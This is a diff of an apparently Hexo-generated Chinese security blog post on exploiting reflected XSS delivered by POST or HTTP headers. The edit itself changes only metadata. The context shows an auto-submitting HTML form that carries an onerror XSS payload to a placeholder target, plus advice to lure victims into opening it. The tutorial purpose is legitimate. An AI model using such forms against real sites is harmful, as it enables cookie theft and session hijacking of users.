@@ -80,23 +80,20 @@
 
 
 
-<meta name="description" content="0x01 前言反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。但是若js代码是在post数据包，或者是在header里，那就更显得鸡肋了，甚至无法利用。我查阅了大量的资料，有了下面的尝试。
-0x02 POST型反射">
+<meta name="description" content="0x01 前言反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。但是若js代码是在post数据包，或者是在header里，那就更显得鸡肋了，甚至无法利用。我查阅了大量的资料，有了下面的尝试。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="不常见的xss利用探索">
 <meta property="og:url" content="http://yoursite.com/2016/06/27/不常见的反射型xss利用/index.html">
 <meta property="og:site_name" content="wps2015的博客">
-<meta property="og:description" content="0x01 前言反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。但是若js代码是在post数据包，或者是在header里，那就更显得鸡肋了，甚至无法利用。我查阅了大量的资料，有了下面的尝试。
-0x02 POST型反射">
+<meta property="og:description" content="0x01 前言反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。但是若js代码是在post数据包，或者是在header里，那就更显得鸡肋了，甚至无法利用。我查阅了大量的资料，有了下面的尝试。">
 <meta property="og:image" content="https://img.alicdn.com/imgextra/i1/792076116/TB2e_kZrVXXXXabXpXXXXXXXXXX_!!792076116.png">
 <meta property="og:image" content="https://img.alicdn.com/imgextra/i3/792076116/TB2QcVdsXXXXXcuXXXXXXXXXXXX_!!792076116.png">
 <meta property="og:image" content="https://img.alicdn.com/imgextra/i4/792076116/TB2VI8usXXXXXXgXpXXXXXXXXXX_!!792076116.png">
 <meta property="og:image" content="https://img.alicdn.com/imgextra/i3/792076116/TB2XvxKsXXXXXaYXXXXXXXXXXXX_!!792076116.png">
-<meta property="og:updated_time" content="2016-06-29T07:11:39.752Z">
+<meta property="og:updated_time" content="2016-06-29T07:15:03.492Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="不常见的xss利用探索">
-<meta name="twitter:description" content="0x01 前言反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。但是若js代码是在post数据包，或者是在header里，那就更显得鸡肋了，甚至无法利用。我查阅了大量的资料，有了下面的尝试。
-0x02 POST型反射">
+<meta name="twitter:description" content="0x01 前言反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。但是若js代码是在post数据包，或者是在header里，那就更显得鸡肋了，甚至无法利用。我查阅了大量的资料，有了下面的尝试。">
 <meta name="twitter:image" content="https://img.alicdn.com/imgextra/i1/792076116/TB2e_kZrVXXXXabXpXXXXXXXXXX_!!792076116.png">
 
 
@@ -331,7 +328,7 @@
       
 
       
-        <h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。但是若js代码是在post数据包，或者是在header里，那就更显得鸡肋了，甚至无法利用。我查阅了大量的资料，有了下面的尝试。</p>
+        <h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。但是若js代码是在post数据包，或者是在header里，那就更显得鸡肋了，甚至无法利用。我查阅了大量的资料，有了下面的尝试。<a id="more"></a></p>
 <h3 id="0x02-POST型反射xss"><a href="#0x02-POST型反射xss" class="headerlink" title="0x02 POST型反射xss"></a>0x02 POST型反射xss</h3><p>对于post反射型xss，其实已经有比较成熟的利用方法：构造post表单，利用js直接提交。表单构造如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>  <span class="attr">name</span>=<span class="string">"form"</span> <span class="attr">id</span>=<span class="string">"form1"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://target.com/test.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"searchKey"</span> <span class="attr">hidden</span>=<span class="string">"true"</span> <span class="attr">value</span>=<span class="string">'test"&gt;&lt;img src=1 onerror=alert(document.domain)&gt;'</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><br><span class="line">document.getElementById('form1').submit();</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>将html保存后，诱导被攻击者访问这个html文件，触发如下：<br><img src="https://img.alicdn.com/imgextra/i1/792076116/TB2e_kZrVXXXXabXpXXXXXXXXXX_!!792076116.png" alt="post"></p>
 <h3 id="0x03-http头部反射xss"><a href="#0x03-http头部反射xss" class="headerlink" title="0x03 http头部反射xss"></a>0x03 http头部反射xss</h3><p>如果xss代码的输入点是在http头部的话，那么利用表单提交的方法就不行。利用ajax异步跨域请求的方法等会再谈，先说说一个比较特殊的头信息<code>referer</code>。</p>
